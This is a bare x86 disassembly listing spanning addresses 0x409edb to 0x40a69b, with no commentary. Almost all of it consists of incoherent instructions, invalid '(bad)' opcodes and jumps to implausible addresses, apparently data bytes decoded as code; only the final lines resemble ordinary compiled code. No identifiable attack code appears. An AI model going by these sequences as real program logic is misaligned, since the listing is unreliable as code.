  409edb:	(bad)  
  409edc:	or     al,0xc5
  409ede:	ror    dh,cl
  409ee0:	mov    ah,0x3
  409ee2:	jmp    0x747c661d
  409ee7:	jo     0x409f44
  409ee9:	mov    edx,0xfa2b801f
  409eee:	mov    ecx,0x7a20b242
  409ef3:	add    esi,DWORD PTR [edx-0x3adc9538]
  409ef9:	out    dx,eax
  409efa:	bound  esp,QWORD PTR [ebx+edi*4]
  409efd:	std    
  409efe:	jmp    0x6c0b71f4
  409f03:	gs dec eax
  409f05:	mov    ds:0x57ad2984,al
  409f0a:	repz and eax,0xaa9d1176
  409f10:	cmp    al,0xb1
  409f12:	scas   eax,DWORD PTR es:[edi]
  409f13:	es leave 
  409f15:	push   esp
  409f16:	test   BYTE PTR [edx+0x2e],0xa3
  409f1a:	xor    BYTE PTR [eax+eax*4-0x40],cl
  409f1e:	lock adc eax,0x69edc9e4
  409f24:	dec    edi
  409f25:	nop
  409f26:	dec    ebp
  409f27:	sbb    dl,cl
  409f29:	rcr    dh,0x9f
  409f2c:	xchg   edx,eax
  409f2d:	push   eax
  409f2e:	mov    ds:0x1605de62,al
  409f33:	xor    BYTE PTR [esi-0x16],dl
  409f36:	push   ebx
  409f37:	xchg   edx,eax
  409f38:	popa   
  409f39:	fsubr  st(7),st
  409f3b:	push   edx
  409f3c:	cmp    ch,al
  409f3e:	cmc    
  409f3f:	inc    esp
  409f40:	popf   
  409f41:	fimul  WORD PTR [edx-0x207cf0fb]
  409f47:	adc    ebx,DWORD PTR [edi]
  409f49:	dec    edx
  409f4a:	dec    esp
  409f4b:	or     eax,0xf71a2336
  409f50:	ja     0x409f60
  409f52:	cdq    
  409f53:	mov    ds:0xcf48872,eax
  409f58:	retf   0xe45b
  409f5b:	shl    BYTE PTR [ebx],cl
  409f5d:	out    dx,eax
  409f5e:	scas   eax,DWORD PTR es:[edi]
  409f5f:	ret    
  409f60:	mov    al,0x32
  409f62:	mov    ds:0xa48e11b6,eax
  409f67:	call   0xf86a213f
  409f6c:	in     eax,dx
  409f6d:	jb     0x409f47
  409f6f:	lods   al,BYTE PTR ds:[esi]
  409f70:	(bad)  
  409f71:	das    
  409f72:	ret    
  409f73:	(bad)  
  409f74:	shl    DWORD PTR [esi+0x172d43b5],1
  409f7a:	leave  
  409f7b:	shl    cl,1
  409f7d:	imul   ecx,DWORD PTR [esi],0x97780f65
  409f83:	lea    ecx,[edi+0xb]
  409f86:	xor    eax,0xd3a9308b
  409f8b:	in     al,dx
  409f8c:	and    al,0x7a
  409f8e:	cmc    
  409f8f:	jo     0x409fa1
  409f91:	mov    WORD PTR [edi],ds
  409f93:	mov    eax,0xced318e6
  409f98:	adc    bh,bl
  409f9a:	mov    ah,0x38
  409f9c:	ss or  bl,bh
  409f9f:	add    al,0x83
  409fa1:	mov    edi,0xe208eda7
  409fa6:	pop    ebx
  409fa7:	mov    WORD PTR [edx+0xc],fs
  409faa:	inc    eax
  409fab:	clc    
  409fac:	or     eax,0x15e1c8f2
  409fb1:	push   ecx
  409fb2:	pop    es
  409fb3:	push   0x9f53358e
  409fb8:	retf   0xe34f
  409fbb:	or     BYTE PTR ds:0x9219c411,cl
  409fc1:	aaa    
  409fc2:	jno    0x409fad
  409fc4:	(bad)  
  409fc5:	dec    eax
  409fc6:	and    DWORD PTR [ebx+0x626a2e2f],0xa9f7a0fb
  409fd0:	mov    ebx,0x816d68c
  409fd5:	inc    esp
  409fd6:	aad    0x72
  409fd8:	jb     0x40a047
  409fda:	mov    ecx,0x76410f26
  409fdf:	jecxz  0x409ff8
  409fe1:	xchg   edi,eax
  409fe2:	gs adc eax,0x5a2dd35b
  409fe8:	scas   al,BYTE PTR es:[edi]
  409fe9:	dec    ebx
  409fea:	adc    eax,0x9edccc96
  409fef:	or     ah,BYTE PTR [edx+edi*1-0x50bcbb94]
  409ff6:	sbb    al,BYTE PTR ds:0xdd4674b4
  409ffc:	sti    
  409ffd:	cdq    
  409ffe:	retf   
  409fff:	out    0x19,al
  40a001:	ds loop 0x40a056
  40a004:	repz adc cl,BYTE PTR [ebx+0x75ec23e0]
  40a00b:	sbb    ch,BYTE PTR [ebp+0x7f5bd3a2]
  40a011:	lock jno 0x40a08a
  40a014:	pop    edi
  40a015:	mov    edi,0x9628068f
  40a01a:	sub    ah,al
  40a01c:	cmp    dh,bl
  40a01e:	pop    ebp
  40a01f:	in     al,0x9b
  40a021:	xor    eax,0x4335a928
  40a026:	and    ebp,DWORD PTR [ebx-0x6a]
  40a029:	rcl    BYTE PTR [eax+0x6e5619ac],1
  40a02f:	mov    edx,0x67797647
  40a034:	pusha  
  40a035:	stos   BYTE PTR es:[edi],al
  40a036:	push   edi
  40a037:	rol    BYTE PTR [bp-0x2a],1
  40a03b:	je     0x40a046
  40a03d:	clc    
  40a03e:	call   0xb150:0x5af6eca0
  40a045:	ds (bad) 
  40a047:	jmp    0x40a0ba
  40a049:	(bad)  [edi-0x6f0a0ea9]
  40a04f:	(bad)  [ebp-0x58e4beb2]
  40a055:	pop    ebx
  40a056:	shl    BYTE PTR [eax],cl
  40a058:	cmp    al,0xe3
  40a05a:	fwait
  40a05b:	data16 add BYTE PTR [ecx+0x37],ch
  40a05f:	fnstenv [edx-0x6b7e80e5]
  40a065:	daa    
  40a066:	push   edi
  40a067:	test   al,0x57
  40a069:	xor    eax,0xcf7d420a
  40a06e:	out    dx,eax
  40a06f:	pop    esi
  40a070:	(bad)  
  40a071:	mov    BYTE PTR [edi+0x685b99af],dh
  40a077:	shl    BYTE PTR [ebp+0x13],1
  40a07a:	cmp    esp,ecx
  40a07c:	dec    edi
  40a07d:	push   ebp
  40a07e:	jno    0x40a096
  40a080:	add    eax,0xd367e1d3
  40a085:	jmp    0x40a089
  40a087:	repnz pop edx
  40a089:	shr    DWORD PTR [esi+0x135d8871],0x1c
  40a090:	loope  0x40a103
  40a092:	(bad)  
  40a093:	pop    ebx
  40a094:	mov    ebp,0xbd008e11
  40a099:	icebp  
  40a09a:	(bad)  
  40a09b:	clc    
  40a09c:	ret    0x578f
  40a09f:	mov    WORD PTR ds:0x8b3d8f6,ds
  40a0a5:	mov    dl,0x6d
  40a0a7:	xor    ah,BYTE PTR [ebp+0x38d04cbe]
  40a0ad:	aad    0x1a
  40a0af:	xchg   edi,eax
  40a0b0:	retf   
  40a0b1:	outs   dx,DWORD PTR ds:[esi]
  40a0b2:	lods   eax,DWORD PTR ds:[esi]
  40a0b3:	ror    al,1
  40a0b5:	mov    eax,0x68b24d16
  40a0ba:	bound  ebp,QWORD PTR cs:[esi+eax*8+0x5f0e1a71]
  40a0c2:	pusha  
  40a0c3:	mov    esi,0xba4e767d
  40a0c8:	shr    DWORD PTR [ebp-0x59],cl
  40a0cb:	pushf  
  40a0cc:	loope  0x40a0b9
  40a0ce:	add    BYTE PTR [ecx-0x60],ah
  40a0d1:	es mov esp,0x579faaed
  40a0d7:	push   cs
  40a0d8:	adc    DWORD PTR ds:0x27f6ebfa,edx
  40a0de:	mov    ebp,ebx
  40a0e0:	stc    
  40a0e1:	jne    0x40a15b
  40a0e3:	pop    ecx
  40a0e4:	ins    BYTE PTR es:[edi],dx
  40a0e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0e7:	pop    ebp
  40a0e8:	mov    dl,0xf0
  40a0ea:	cld    
  40a0eb:	les    esp,FWORD PTR [ebp-0x69c4a4e5]
  40a0f1:	mov    cl,0x45
  40a0f3:	das    
  40a0f4:	loop   0x40a0e6
  40a0f6:	and    esp,edi
  40a0f8:	in     al,0x18
  40a0fa:	inc    edi
  40a0fb:	push   cs
  40a0fc:	repz fistp DWORD PTR [edx]
  40a0ff:	hlt    
  40a100:	imul   ebx,DWORD PTR [esi],0xcf8b8660
  40a106:	je     0x40a115
  40a108:	adc    eax,0x87622260
  40a10d:	fwait
  40a10e:	mov    ebx,0xae7ef091
  40a113:	and    eax,0x37562a94
  40a119:	pushf  
  40a11a:	pop    ss
  40a11b:	aas    
  40a11c:	jle    0x40a189
  40a11e:	cld    
  40a11f:	mov    al,0x9b
  40a121:	mov    edi,0x6887a9c3
  40a126:	outs   dx,DWORD PTR ds:[esi]
  40a127:	mov    eax,ds:0x7a941131
  40a12c:	rol    BYTE PTR [eax-0x7e],1
  40a12f:	imul   ecx,DWORD PTR ss:[esi-0x1c09b0c0],0xe641fd8
  40a13a:	ds stc 
  40a13c:	outs   dx,BYTE PTR ds:[esi]
  40a13d:	ret    
  40a13e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a13f:	sub    BYTE PTR [ebp-0x81b8104],0xd0
  40a146:	sbb    eax,0x4c38e910
  40a14b:	bound  esp,QWORD PTR ds:0xdd3277b2
  40a151:	mov    DWORD PTR [esi],eax
  40a153:	std    
  40a154:	mov    ds:0x9edcf093,eax
  40a159:	mov    dl,0xab
  40a15b:	jge    0x40a112
  40a15d:	add    eax,0xf05662c4
  40a162:	jae    0x40a148
  40a164:	mov    dl,0x4e
  40a166:	pop    edi
  40a167:	popf   
  40a168:	adc    al,0x92
  40a16a:	sub    DWORD PTR [esi-0x39],0x6cd2c2e4
  40a171:	jns    0xe4463480
  40a177:	sub    dl,BYTE PTR [esp-0x34]
  40a17b:	rol    BYTE PTR [ecx+0x16],0x6d
  40a17f:	verw   WORD PTR [edx]
  40a182:	icebp  
  40a183:	sbb    al,0x25
  40a185:	std    
  40a186:	(bad)  
  40a187:	mov    edx,0x1de90ae1
  40a18c:	ficomp WORD PTR [esi]
  40a18e:	cmp    ch,BYTE PTR [esi-0x61b0e076]
  40a194:	pop    edi
  40a195:	jge    0x40a151
  40a197:	pop    ecx
  40a198:	mov    ch,0x77
  40a19a:	jo     0x40a1b0
  40a19c:	pop    ss
  40a19d:	das    
  40a19e:	daa    
  40a19f:	xchg   esi,eax
  40a1a0:	stc    
  40a1a1:	mov    al,ds:0xca28764f
  40a1a6:	pop    ebp
  40a1a7:	fstp   QWORD PTR [ebx+0x72c2d674]
  40a1ad:	div    DWORD PTR [esi]
  40a1af:	pop    es
  40a1b0:	aas    
  40a1b1:	jbe    0x40a1ca
  40a1b3:	ins    BYTE PTR es:[edi],dx
  40a1b4:	push   es
  40a1b5:	jp     0x40a235
  40a1b7:	sub    eax,0x1d2c74a0
  40a1bc:	jge    0x40a189
  40a1be:	adc    eax,0x4df5fd59
  40a1c3:	cwde   
  40a1c4:	mov    ch,0xbd
  40a1c6:	outs   dx,DWORD PTR ds:[esi]
  40a1c7:	fiadd  WORD PTR [ecx+0x9f2834]
  40a1cd:	mov    ah,0x91
  40a1cf:	test   eax,0xb8e19fdc
  40a1d4:	pop    ebx
  40a1d5:	mov    eax,ds:0xa7291b27
  40a1da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1db:	lea    eax,[eax+0x19]
  40a1de:	cli    
  40a1df:	mov    bl,0xb5
  40a1e1:	ja     0x40a235
  40a1e3:	push   cs
  40a1e4:	loope  0x40a212
  40a1e6:	dec    eax
  40a1e7:	sti    
  40a1e8:	out    0xf,al
  40a1ea:	adc    edx,DWORD PTR [ebx-0x609fb8a0]
  40a1f0:	repnz (bad)
  40a1f3:	add    edx,DWORD PTR [ebx-0x7d48a5a9]
  40a1f9:	rol    eax,1
  40a1fb:	test   al,ch
  40a1fd:	mov    bh,0x88
  40a1ff:	xchg   esp,eax
  40a200:	hlt    
  40a201:	mov    al,ds:0x83d6b93c
  40a206:	es call 0x9485:0x4eea49fa
  40a20e:	xchg   edi,eax
  40a20f:	mov    edx,0x873232c8
  40a214:	shl    BYTE PTR [edx-0x38],1
  40a217:	jl     0x40a26d
  40a219:	dec    ecx
  40a21a:	ds push ebp
  40a21c:	inc    esi
  40a21d:	ss clc 
  40a21f:	out    dx,al
  40a220:	cld    
  40a221:	sub    ch,BYTE PTR [esi-0x6787a256]
  40a227:	imul   edi,DWORD PTR [ecx],0x11
  40a22a:	push   ds
  40a22b:	fisttp DWORD PTR [edi]
  40a22d:	push   esp
  40a22e:	jns    0x40a1de
  40a230:	or     al,0xe3
  40a232:	out    0xdd,al
  40a234:	cmp    BYTE PTR [ecx+0x42],0x26
  40a238:	and    dh,BYTE PTR [esi-0x16]
  40a23b:	dec    edx
  40a23c:	pushf  
  40a23d:	loopne 0x40a22c
  40a23f:	(bad)  
  40a240:	mov    eax,ds:0xb57a542e
  40a246:	add    al,0x1e
  40a248:	mov    WORD PTR [esi],gs
  40a24a:	fisttp QWORD PTR [eax-0x46]
  40a24d:	pop    edi
  40a24e:	xor    cl,ah
  40a250:	or     DWORD PTR [edx+0x6],esp
  40a253:	fwait
  40a254:	mov    dh,0x2
  40a256:	inc    edx
  40a257:	mov    al,ds:0xf5f0753a
  40a25c:	mov    dl,0x7b
  40a25e:	sbb    edx,DWORD PTR [esi+0x62]
  40a261:	mov    cl,0x30
  40a263:	xchg   esp,eax
  40a264:	mov    ds:0xa9330d31,eax
  40a269:	shl    DWORD PTR cs:[ebx+0x1c2be47e],cl
  40a270:	into   
  40a271:	and    ah,bl
  40a273:	iret   
  40a274:	mov    ch,BYTE PTR [eax+0x60345c20]
  40a27a:	dec    edi
  40a27b:	in     eax,dx
  40a27c:	pop    ecx
  40a27d:	pop    edi
  40a27e:	clc    
  40a27f:	mov    cl,0xf0
  40a281:	inc    edx
  40a282:	std    
  40a283:	sar    cl,0x94
  40a286:	cmp    cl,ch
  40a288:	stos   BYTE PTR es:[edi],al
  40a289:	les    edi,FWORD PTR [edx-0x2d]
  40a28c:	(bad)  
  40a28e:	inc    edx
  40a28f:	(bad)  
  40a290:	(bad)  [ebx+ecx*2-0x68]
  40a294:	mov    bl,0x0
  40a296:	rcr    eax,0x28
  40a299:	inc    ebx
  40a29a:	dec    eax
  40a29b:	adc    ebp,edx
  40a29d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a29e:	inc    edi
  40a29f:	push   edi
  40a2a0:	ins    BYTE PTR es:[edi],dx
  40a2a1:	ins    DWORD PTR es:[edi],dx
  40a2a2:	push   ecx
  40a2a3:	ret    
  40a2a4:	xchg   esi,eax
  40a2a5:	dec    eax
  40a2a6:	and    al,0x27
  40a2a8:	cmp    bl,bh
  40a2aa:	stos   DWORD PTR es:[edi],eax
  40a2ab:	xor    al,0x1
  40a2ad:	in     al,0x2b
  40a2af:	fnsave [esi]
  40a2b1:	xchg   ecx,eax
  40a2b2:	mov    dh,0x83
  40a2b4:	ins    BYTE PTR es:[edi],dx
  40a2b5:	outs   dx,BYTE PTR ds:[esi]
  40a2b6:	sub    dh,ah
  40a2b8:	add    eax,0x3ca329be
  40a2bd:	scas   al,BYTE PTR es:[edi]
  40a2be:	arpl   WORD PTR [eax-0x11],ax
  40a2c1:	test   al,0x6d
  40a2c3:	lock in al,0x72
  40a2c6:	adc    BYTE PTR [edx+0x33],ah
  40a2c9:	sbb    ah,BYTE PTR [ebx+0x5f]
  40a2cc:	jmp    0xe487:0xa8edb288
  40a2d3:	jno    0x40a263
  40a2d5:	int    0x52
  40a2d7:	xchg   DWORD PTR [ecx+ebx*2],ebp
  40a2da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2db:	push   esi
  40a2dc:	fmul   DWORD PTR [eax]
  40a2de:	mov    edx,0x850f2d79
  40a2e3:	push   eax
  40a2e4:	xor    eax,0x83d3d8f6
  40a2e9:	cli    
  40a2ea:	in     eax,0x2f
  40a2ec:	hlt    
  40a2ed:	mov    edi,0xea29aa6c
  40a2f2:	xchg   BYTE PTR ss:[esi-0xcc7a5c1],ch
  40a2f9:	mov    dl,0x4
  40a2fb:	xor    ecx,0x9d4e0e36
  40a301:	sbb    BYTE PTR [edi-0x5c],ah
  40a304:	xor    esi,DWORD PTR [edx+0x60]
  40a307:	add    BYTE PTR ds:0xca94ce9a,bh
  40a30d:	add    cl,cl
  40a30f:	lods   eax,DWORD PTR ds:[esi]
  40a310:	jle    0x40a383
  40a312:	imul   ebx,DWORD PTR [ebx],0xffffffea
  40a315:	sbb    BYTE PTR [edi-0x79],ah
  40a318:	mov    dl,0x27
  40a31a:	mov    edx,ebp
  40a31c:	stos   DWORD PTR es:[edi],eax
  40a31d:	xchg   DWORD PTR [esi-0x70da0d32],ecx
  40a323:	xchg   edx,eax
  40a324:	lods   eax,DWORD PTR es:[esi]
  40a326:	addr16 inc eax
  40a328:	adc    al,ah
  40a32a:	lea    esi,[ebx+esi*4]
  40a32d:	adc    eax,0x78d2883c
  40a332:	mov    bl,0xc6
  40a334:	xor    BYTE PTR [eax+0x61],0x11
  40a338:	js     0x40a2c1
  40a33a:	push   esi
  40a33b:	das    
  40a33c:	scas   al,BYTE PTR es:[edi]
  40a33d:	cli    
  40a33e:	outs   dx,DWORD PTR ds:[esi]
  40a33f:	call   0x923d5f3b
  40a344:	inc    DWORD PTR [ebp+0x52]
  40a347:	dec    edx
  40a348:	sahf   
  40a349:	cmc    
  40a34a:	in     eax,dx
  40a34b:	mov    WORD PTR [ecx+0x14f2ddc7],?
  40a351:	dec    esp
  40a352:	jno    0x40a2fa
  40a354:	sbb    DWORD PTR [ecx+0x7d6de3b7],ecx
  40a35a:	lahf   
  40a35b:	dec    ebp
  40a35c:	xor    eax,0xe8b43b3c
  40a361:	jge    0x40a33e
  40a363:	cmp    eax,DWORD PTR [eax+esi*8+0x46f0ab9c]
  40a36a:	mov    eax,edx
  40a36c:	fs push edi
  40a36e:	add    al,0x22
  40a370:	pop    ebp
  40a371:	mov    al,0x60
  40a373:	xchg   edi,eax
  40a374:	pop    esi
  40a375:	stos   DWORD PTR es:[edi],eax
  40a376:	sbb    bl,BYTE PTR [ebx+0x2e]
  40a379:	push   ebp
  40a37a:	daa    
  40a37b:	or     al,0xd7
  40a37d:	add    edi,esp
  40a37f:	cs push ecx
  40a381:	jo     0x40a3db
  40a383:	gs sub bh,ah
  40a386:	sbb    cl,cl
  40a388:	sti    
  40a389:	lds    edx,FWORD PTR [ecx+0x63c4cf38]
  40a38f:	rcl    esp,cl
  40a391:	mov    ecx,0x49372914
  40a396:	je     0x40a32e
  40a398:	sub    BYTE PTR [ebx],bl
  40a39a:	scas   eax,DWORD PTR es:[edi]
  40a39b:	pop    ecx
  40a39c:	loope  0x40a373
  40a39e:	scas   al,BYTE PTR es:[edi]
  40a39f:	daa    
  40a3a0:	jae    0x40a336
  40a3a2:	shr    BYTE PTR [ebx+0x3f],1
  40a3a5:	imul   edi,DWORD PTR [ebp+0x35],0x5461c490
  40a3ac:	pushf  
  40a3ad:	add    BYTE PTR [ebx+0x4a4a8f4a],bh
  40a3b3:	in     al,0x7
  40a3b5:	sbb    eax,DWORD PTR [ebp-0x195983aa]
  40a3bb:	sbb    esp,DWORD PTR [edi]
  40a3bd:	addr16 push edx
  40a3bf:	pop    esi
  40a3c0:	in     eax,dx
  40a3c1:	sub    dl,cl
  40a3c3:	mov    ch,dl
  40a3c5:	in     eax,0x5b
  40a3c7:	sbb    bl,bl
  40a3c9:	jecxz  0x40a38b
  40a3cb:	xchg   edi,eax
  40a3cc:	pop    esp
  40a3cd:	add    DWORD PTR [ebp-0xd],edx
  40a3d0:	loopne 0x40a3c0
  40a3d2:	sub    bh,BYTE PTR [edx+eax*8]
  40a3d5:	sub    edi,edx
  40a3d7:	stos   DWORD PTR es:[edi],eax
  40a3d8:	mov    al,0xa7
  40a3da:	pop    es
  40a3db:	dec    edx
  40a3dc:	aas    
  40a3dd:	out    0xbe,al
  40a3df:	fist   DWORD PTR [ebx]
  40a3e1:	call   0xeeefe3b1
  40a3e6:	adc    al,0x9e
  40a3e8:	mov    DWORD PTR [esi-0x2e],edi
  40a3eb:	sbb    DWORD PTR [ecx+0x52139caa],eax
  40a3f1:	push   ecx
  40a3f2:	retf   0x3373
  40a3f5:	jmp    0xf4141471
  40a3fa:	popf   
  40a3fb:	dec    esp
  40a3fc:	adc    ch,BYTE PTR [ecx-0x58]
  40a3ff:	sub    DWORD PTR [eax-0x26],0x8
  40a403:	fcomp  DWORD PTR [edx+0xf]
  40a406:	inc    ebx
  40a407:	(bad)  
  40a409:	lds    eax,FWORD PTR [esi]
  40a40b:	in     al,dx
  40a40c:	mov    ds:0x6e4cf83f,al
  40a411:	push   eax
  40a412:	push   ds
  40a413:	inc    edi
  40a414:	test   eax,0xe50a98e4
  40a419:	sti    
  40a41a:	mov    cl,0xbf
  40a41c:	mov    al,ds:0xbff69340
  40a421:	jl     0x40a47f
  40a423:	aad    0x28
  40a425:	icebp  
  40a426:	iret   
  40a427:	loope  0x40a3e0
  40a429:	adc    dh,BYTE PTR [ebp-0x1e]
  40a42c:	pop    es
  40a42d:	cld    
  40a42e:	call   DWORD PTR [esi+0x67]
  40a431:	sbb    edi,DWORD PTR [edi+0x3f496fd8]
  40a437:	push   ds
  40a438:	mov    ah,cl
  40a43a:	xor    BYTE PTR ds:0xf19bf8c0,bl
  40a440:	(bad)  
  40a441:	sub    al,0x15
  40a443:	jle    0x40a4ad
  40a445:	sbb    ebp,ebp
  40a447:	icebp  
  40a448:	xchg   ecx,eax
  40a449:	in     eax,dx
  40a44a:	loope  0x40a4a0
  40a44c:	mov    ds:0xe706d5e7,al
  40a451:	es push edx
  40a453:	or     DWORD PTR [edi+0x45bf9ddd],edi
  40a459:	cmp    esp,DWORD PTR [ecx]
  40a45b:	mov    cl,BYTE PTR [ebx-0x5e]
  40a45e:	call   0x775c:0xb16ce0dd
  40a465:	shl    DWORD PTR [edx+0x34071ade],cl
  40a46b:	adc    DWORD PTR [eax-0x6e638be5],edx
  40a471:	das    
  40a472:	aas    
  40a473:	inc    edi
  40a474:	int3   
  40a475:	cmp    BYTE PTR [esi+0x74a5de34],cl
  40a47b:	xor    eax,0x51ed251d
  40a480:	push   edx
  40a481:	jge    0x40a4dc
  40a483:	lods   eax,DWORD PTR ds:[esi]
  40a484:	dec    edx
  40a485:	add    BYTE PTR [ecx+edx*1],bl
  40a488:	adc    ch,BYTE PTR [edx+0x48b8a5f]
  40a48e:	mov    BYTE PTR [eax+eax*4+0x5e81aa09],ch
  40a495:	ret    
  40a496:	call   FWORD PTR [esi]
  40a498:	pop    eax
  40a499:	jb     0x40a513
  40a49b:	ret    0x3c2a
  40a49e:	int    0xad
  40a4a0:	mov    bh,0xd2
  40a4a2:	rol    BYTE PTR [edx+0x44],0xa6
  40a4a6:	ror    DWORD PTR [esi+0x47f63b89],1
  40a4ac:	dec    edx
  40a4ad:	mov    edx,0x727af59f
  40a4b2:	jae    0x40a4b0
  40a4b4:	cdq    
  40a4b5:	bound  ecx,QWORD PTR [esi-0xd]
  40a4b8:	mov    ecx,DWORD PTR [esi-0x39]
  40a4bb:	sahf   
  40a4bc:	xchg   esp,eax
  40a4bd:	push   ds
  40a4be:	js     0x40a4fe
  40a4c0:	fwait
  40a4c1:	sahf   
  40a4c2:	xchg   edx,eax
  40a4c3:	loop   0x40a4a0
  40a4c5:	test   eax,0xc95f8c78
  40a4ca:	aam    0x15
  40a4cc:	xlat   BYTE PTR ds:[ebx]
  40a4cd:	aad    0x37
  40a4cf:	dec    edx
  40a4d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4d1:	sbb    al,0xcf
  40a4d3:	das    
  40a4d4:	dec    esp
  40a4d5:	ficom  DWORD PTR [edx-0xacec6ce]
  40a4db:	rcr    DWORD PTR [edi+0x36563613],0x25
  40a4e2:	test   ch,bl
  40a4e4:	ret    
  40a4e5:	adc    BYTE PTR [ecx],bh
  40a4e7:	ret    0x13f5
  40a4ea:	(bad)  
  40a4eb:	in     eax,dx
  40a4ec:	adc    al,0xfe
  40a4ee:	jp     0x40a560
  40a4f0:	push   edi
  40a4f1:	push   0x8fc3b375
  40a4f6:	mov    dl,0x83
  40a4f8:	jp     0x40a52d
  40a4fa:	mov    bh,0x2e
  40a4fc:	(bad)  
  40a4fe:	and    BYTE PTR [esi+0x43],0x3b
  40a502:	fwait
  40a503:	mov    DWORD PTR ds:0x73677953,0x6291cd48
  40a50d:	lods   eax,DWORD PTR ds:[esi]
  40a50e:	jge    0x40a51a
  40a510:	or     cl,dl
  40a512:	or     eax,0xc3e87f8c
  40a517:	adc    ah,ah
  40a519:	xor    eax,DWORD PTR [esi]
  40a51b:	stc    
  40a51c:	sbb    al,0xea
  40a51e:	and    BYTE PTR [eax+0x1187375f],ah
  40a524:	push   esp
  40a525:	jo     0x40a58c
  40a527:	inc    ebp
  40a528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a529:	dec    edi
  40a52a:	sahf   
  40a52b:	adc    ebx,0xffffffea
  40a52e:	inc    ebx
  40a52f:	fstp   st(6)
  40a531:	scas   al,BYTE PTR es:[edi]
  40a532:	xor    al,0x6c
  40a534:	fwait
  40a535:	jp     0x40a55f
  40a537:	out    0x7a,eax
  40a539:	push   esi
  40a53a:	xor    BYTE PTR [edx*8-0x729a42ce],0xd4
  40a542:	or     BYTE PTR [eax],cl
  40a544:	adc    eax,0xceee63f7
  40a549:	call   0x961:0xc7def862
  40a550:	cmp    cl,BYTE PTR [edx-0x98c877]
  40a556:	arpl   WORD PTR [ebx+edi*2+0x8],bx
  40a55a:	outs   dx,BYTE PTR ds:[esi]
  40a55b:	xchg   dh,ah
  40a55d:	inc    ebx
  40a55e:	jne    0x40a525
  40a560:	arpl   WORD PTR ds:0x4eaaf9df,di
  40a566:	pop    ss
  40a567:	dec    edi
  40a568:	fimul  DWORD PTR [ecx+eiz*8]
  40a56b:	sbb    esi,edi
  40a56d:	mov    bh,0x59
  40a56f:	and    eax,0x5d7649aa
  40a574:	scas   eax,DWORD PTR es:[edi]
  40a575:	loope  0x40a56b
  40a577:	fst    QWORD PTR [edx]
  40a579:	ja     0x40a5d7
  40a57b:	cdq    
  40a57c:	pop    es
  40a57d:	xchg   BYTE PTR [ebx-0xc],bh
  40a580:	and    al,0x32
  40a582:	mov    al,ah
  40a584:	int3   
  40a585:	and    al,0x15
  40a587:	call   0x7136:0x6e2abdd3
  40a58e:	add    ecx,DWORD PTR ds:0xbbb9945
  40a594:	mov    DWORD PTR ds:0xb9221bbd,esp
  40a59a:	cmp    BYTE PTR [ebp-0x1327d961],0x12
  40a5a1:	push   edi
  40a5a2:	push   es
  40a5a3:	dec    eax
  40a5a4:	shl    DWORD PTR fs:0x27791e2a,cl
  40a5ab:	pop    es
  40a5ac:	jecxz  0x40a5aa
  40a5ae:	cmp    esi,0x39ca0250
  40a5b4:	and    eax,0x4a18717
  40a5b9:	ja     0x40a5f3
  40a5bb:	(bad)  
  40a5bc:	int3   
  40a5bd:	xor    eax,0xfbde976f
  40a5c2:	adc    edi,0xffffffa6
  40a5c5:	sub    al,0xaf
  40a5c7:	int3   
  40a5c8:	cmp    ch,BYTE PTR [edi-0x48096132]
  40a5ce:	adc    BYTE PTR [edx],ah
  40a5d0:	pop    ecx
  40a5d1:	cmp    esi,0x74540b67
  40a5d7:	icebp  
  40a5d8:	frstor [edi+0x5d64bcf7]
  40a5de:	dec    ebx
  40a5df:	ffree  st(4)
  40a5e1:	test   BYTE PTR [ebx-0x3a],dl
  40a5e4:	mov    bh,0x8c
  40a5e6:	cmp    al,0x58
  40a5e8:	sbb    ecx,DWORD PTR [ebx]
  40a5ea:	mov    WORD PTR [eax-0x3d],?
  40a5ed:	ds pop eax
  40a5ef:	ret    0xafd0
  40a5f2:	aam    0x8b
  40a5f4:	call   0x517f:0x4a504f52
  40a5fb:	scas   al,BYTE PTR es:[edi]
  40a5fc:	repnz pop ecx
  40a5fe:	sbb    DWORD PTR es:[esi+edx*2-0x34c6cddb],0x232e8eb0
  40a60a:	test   al,0xb8
  40a60c:	mov    esp,0x6ae22204
  40a611:	ds aas 
  40a613:	or     DWORD PTR [ebp-0x795ece55],0xffffffd9
  40a61a:	xor    al,0xe
  40a61c:	add    dh,BYTE PTR [ebx]
  40a61e:	jnp    0x40a67d
  40a620:	imul   edi,DWORD PTR [ebx+0x37],0xffffff9d
  40a624:	pop    esp
  40a625:	jae    0x40a5de
  40a627:	xchg   edi,eax
  40a628:	fist   WORD PTR [eax-0x54]
  40a62b:	stc    
  40a62c:	mov    esi,0x8e2c5ef7
  40a631:	add    ah,al
  40a633:	jmp    0xaa0f:0xc11bad37
  40a63a:	test   DWORD PTR [ebp+0x6adcd544],0xd6855209
  40a644:	loope  0x40a61a
  40a646:	test   al,0xf6
  40a648:	xor    BYTE PTR [ebx],bl
  40a64a:	sbb    cl,BYTE PTR [ebp-0x5529d009]
  40a650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a651:	sbb    BYTE PTR [ebx-0x62],ah
  40a654:	pop    edi
  40a655:	adc    eax,0xdf960a01
  40a65a:	sub    dh,BYTE PTR [esi]
  40a65c:	or     DWORD PTR ds:0x8efad716,ebp
  40a662:	int    0x87
  40a664:	xor    DWORD PTR [edx-0x817eeda],ebp
  40a66a:	lods   al,BYTE PTR ds:[esi]
  40a66b:	leave  
  40a66c:	loop   0x40a66d
  40a66e:	data16 aas 
  40a670:	push   esp
  40a671:	cwde   
  40a672:	push   eax
  40a673:	iret   
  40a674:	jo     0x40a666
  40a676:	adc    eax,0xa804b82d
  40a67b:	add    BYTE PTR [ecx-0x41],ah
  40a67e:	ror    BYTE PTR [ebx+0x458bf055],0xec
  40a685:	mov    ebx,DWORD PTR [ebp-0x2c]
  40a688:	sub    eax,edx
  40a68a:	xor    ebx,esi
  40a68c:	xor    edx,edx
  40a68e:	add    ebx,edi
  40a690:	div    ebx
  40a692:	mov    DWORD PTR [ebp-0x8],eax
  40a695:	mov    eax,DWORD PTR [ebp-0x44]
  40a698:	mov    edx,DWORD PTR [ebp-0x8]
  40a69b:	xor    eax,esi
